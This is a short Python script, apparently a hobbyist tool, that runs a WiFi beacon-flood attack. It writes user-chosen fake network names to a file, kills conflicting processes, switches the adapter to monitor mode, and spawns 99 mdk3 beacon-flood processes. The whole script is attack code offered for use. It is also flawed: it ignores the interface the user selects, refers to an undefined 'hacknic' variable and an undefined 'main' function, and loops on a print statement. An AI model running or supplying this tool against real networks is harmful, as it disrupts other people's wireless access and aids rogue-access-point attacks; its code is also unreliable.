import subprocess
import re
import time
import curses

def intro():

	print(r"""
	//    _____ ___  ___  ___  _   _ ___     _   ___ ___ 
	//   |_   _/ _ \| _ \/ _ \| | | | __|   /_\ / __| __|
	//     | || (_) |   | (_) | |_| | _|   / _ | (__| _| 
	//     |_| \___/|_|_\\__\_\\___/|___| /_/ \_\___|___|
	//                                                   
	""")





def writez(text,count):
    try:
        with open("beacon.txt", 'w') as file:
            for i in range(1, count + 1):
                file.write(f"{text} {i}\n")  
        print(f"Successfully written {count} lines to beacon.txt")
    except Exception as e:
        print(f"An error occurred: {e}")
        
        
        
        
def beacon():

	wlan_pattern = re.compile("^wlan[0-9]+")

	check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

	if len(check_wifi_result) == 0:
    		print("Please connect a WiFi controller and try again.")
    		exit()

	print("The following WiFi interfaces are available:")
	for index, item in enumerate(check_wifi_result):
    		print(f"{index} - {item}")

	while True:
    		wifi_interface_choice = input("Please select the interface you want to use for the attack: ")
    		try:
        		if check_wifi_result[int(wifi_interface_choice)]:
            			break
    		except:
        		print("Please enter a number that corresponds with the choices.")


	print("WiFi adapter connected!\nNow let's kill conflicting processes:")

	subprocess.run(["sudo", "airmon-ng", "check", "kill"])

	print("Putting Wifi adapter into monitored mode:")

	subprocess.run(["sudo", "airmon-ng", "start","wlan0"])
	
	for x in range(1,100):
	
		subprocess.Popen(["mdk3", "wlan0mon", "b","-f","beacon.txt"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 

	try:
    		while True:
        		print("Creating Beacon Points, press ctrl-c to stop")
	except KeyboardInterrupt:
    		print("Stop monitoring mode")
    		# We run a subprocess.run command where we stop monitoring mode on the network adapter.
    		subprocess.run(["airmon-ng", "stop", hacknic + "mon"])
    		print("Thank you! Exiting now")


if __name__ == "__main__":
    intro()
    text = input("Enter the beacon name: ")
    count = int(input("Enter the number of lines to write: "))  # Get the number of lines from the user
    writez(text,count)
    beacon()
    # Run the curses wrapper
    curses.wrapper(main)
